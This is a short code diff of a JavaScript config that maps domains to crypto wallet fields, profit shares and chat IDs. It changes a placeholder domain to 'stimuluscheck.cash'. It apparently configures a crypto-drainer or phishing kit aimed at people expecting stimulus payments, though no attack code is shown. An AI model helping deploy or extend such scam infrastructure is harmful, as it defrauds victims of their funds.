@@ -7,11 +7,11 @@ module.exports = {
   'www.stimuluscheck.cash': { label: 'MAIN', chatId: '8986598152', evm: '', sol: '', btc: '' },
 };
 module.exports = {
-  'yourdomain.com': {
+  'stimuluscheck.cash': {
     label: 'MAIN',
     shares: { YOU: 1 },
     evm: EVM, sol: SOL, btc: BTC,
-    chatId: process.env.CHAT_MAIN,
+    chatId: process.env.CHAT_CR,
   },
   'ab.yourdomain.com': {
     label: 'AB',
